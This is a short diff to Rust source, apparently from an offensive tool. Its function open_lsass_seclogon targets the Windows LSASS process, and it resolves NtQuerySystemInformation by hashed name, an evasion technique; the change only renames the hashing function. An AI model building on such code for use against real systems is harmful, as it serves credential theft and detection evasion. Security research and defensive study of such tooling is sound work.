@@ -139,7 +139,7 @@ pub fn open_lsass_seclogon(api: &ApiResolver, lsass_pid: u32) -> Result<ProcessH
     };
     let nqsi: FnNtQuerySystemInformation = unsafe {
         std::mem::transmute(
-            api.ntdll(resolver::djb2_hash(b"NtQuerySystemInformation"))
+            api.ntdll(resolver::api_hash(b"NtQuerySystemInformation"))
                 .ok_or("Failed to resolve NtQuerySystemInformation")?,
         )
     };
